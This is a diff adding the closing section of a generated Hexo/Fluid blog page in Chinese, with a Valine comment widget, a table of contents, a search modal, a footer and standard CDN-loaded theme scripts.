+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.5.1/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"sYa0TwEtqgwqBctM2qchGbMG-gzGzoHsz","appKey":"Et6unsKpmF1YFlS3U5IE9nlB","path":"window.location.pathname","placeholder":"请友好交流哦~","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":true,"recordIP":false,"serverURLs":"https://sya0twet.lc-cn-n1-shared.com","emojiCDN":null,"emojiMaps":null,"enableQQ":true},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <footer class="mt-4"> <font size="2" face="Georgia"> <div class="text-center py-3"> <div style="font-size: 0.85rem"> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
